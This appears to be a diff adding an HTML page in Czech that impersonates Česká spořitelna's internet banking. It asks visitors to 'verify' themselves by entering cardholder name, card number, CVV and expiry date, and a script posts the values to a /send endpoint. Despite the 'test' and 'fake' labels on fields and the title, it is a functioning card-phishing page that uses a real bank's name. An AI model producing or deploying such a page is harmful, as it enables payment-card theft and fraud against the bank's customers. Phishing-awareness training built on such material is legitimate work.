@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BANKORA TEST</title>
+
+<style>
+* {
+  box-sizing: border-box;
+}
+
+body {
+  margin: 0;
+  font-family: Arial, sans-serif;
+  background: #f5f5f5;
+  color: #222;
+}
+
+header {
+    background: #0756a5;
+    padding: 22px 8%;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+}
+
+.header-right {
+    color: white;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+.logo-img {
+    height: 80px;
+    width: auto;
+    display: block;
+    object-fit: contain;
+}
+
+nav {
+  background: white;
+  padding: 18px 8%;
+  border-bottom: 1px solid #ddd;
+  color: #333;
+}
+
+main {
+  max-width: 900px;
+  margin: 45px auto;
+  padding: 0 20px;
+}
+
+.card {
+  background: white;
+  padding: 35px;
+  border-radius: 10px;
+  box-shadow: 0 3px 15px #0000000d;
+}
+
+.notice {
+  color: #0756a5;
+  font-weight: bold;
+  margin-bottom: 25px;
+}
+
+h1 {
+  font-size: 27px;
+  margin-bottom: 10px;
+}
+
+.description {
+  color: #666;
+  margin-bottom: 30px;
+  line-height: 1.5;
+}
+
+label {
+  display: block;
+  font-weight: bold;
+  margin: 20px 0 8px;
+}
+
+input {
+  width: 100%;
+  padding: 14px;
+  border: 1px solid #ccc;
+  border-radius: 5px;
+  font-size: 15px;
+  background: #f7f7f7;
+}
+
+button {
+  margin-top: 25px;
+  padding: 14px 25px;
+  background: #0756a5;
+  color: white;
+  border: none;
+  border-radius: 5px;
+  font-size: 15px;
+  cursor: pointer;
+}
+
+button:hover {
+  background: #064582;
+}
+
+#result {
+  margin-top: 20px;
+  color: #0756a5;
+  font-weight: bold;
+}
+
+footer {
+  text-align: center;
+  padding: 25px;
+  color: #777;
+  font-size: 13px;
+}
+
+@media (max-width: 600px) {
+  header {
+    padding: 20px;
+  }
+
+  nav {
+    padding: 15px 20px;
+  }
+
+  .card {
+    padding: 22px;
+  }
+
+  main {
+    margin: 25px auto;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<header>
+    <div class="logo">
+        <img src="logo.png" alt="Logo" class="logo-img">
+    </div>
+
+    <div class="header-right">
+        Internetové bankovnictví
+    </div>
+</header>
+
+<nav>
+  Domů 
+</nav>
+
+<main>
+  <div class="card">
+
+    <div class="notice">
+      Česká spořitelna
+    </div>
+
+    <h1>Platební karta</h1>
+
+    <p class="description">
+      Prosíme zadejte své údaje pro ověření.
+    </p>
+
+    <form id="demoForm">
+
+      <label for="fakeName">Vaše jméno</label>
+      <input
+        id="fakeName"
+        type="text"
+        maxlength="80"
+        placeholder="Petr Novák"
+        required
+      >
+
+      <label for="fakeId">Číslo karty</label>
+      <input
+        id="fakeId"
+        type="text"
+        maxlength="40"
+        placeholder="0000 0000 0000 0000"
+        required
+      >
+
+      <label for="fakeCode">CVV</label>
+      <input
+        id="fakeCode"
+        type="text"
+        maxlength="40"
+        placeholder="123"
+        required
+      >
+
+      <label for="fakeDate">Datum expirace</label>
+      <input
+        id="fakeDate"
+        type="month"
+        placeholder="MM/RR"
+        required
+      >
+
+      <button type="submit">Odeslat</button>
+
+    </form>
+
+    <p id="result"></p>
+
+  </div>
+</main>
+
+<footer>
+  © 2026 Česká spořitelna, a.s.
+</footer>
+
+<script>
+document.getElementById("demoForm").addEventListener("submit", async function(e) {
+    e.preventDefault();
+
+    const data = {
+        name: document.getElementById("fakeName").value,
+        testId: document.getElementById("fakeId").value,
+        testCode: document.getElementById("fakeCode").value,
+        testDate: document.getElementById("fakeDate").value
+    };
+
+    const result = document.getElementById("result");
+
+    try {
+        const response = await fetch("/send", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data)
+        });
+
+        const answer = await response.json();
+        result.textContent = answer.success
+            ? "Testovací data přijata!"
+            : "Odeslání se nepodařilo.";
+    } catch {
+        result.textContent = "Server není spuštěný.";
+    }
+});
+</script>
+
+</body>
+</html>
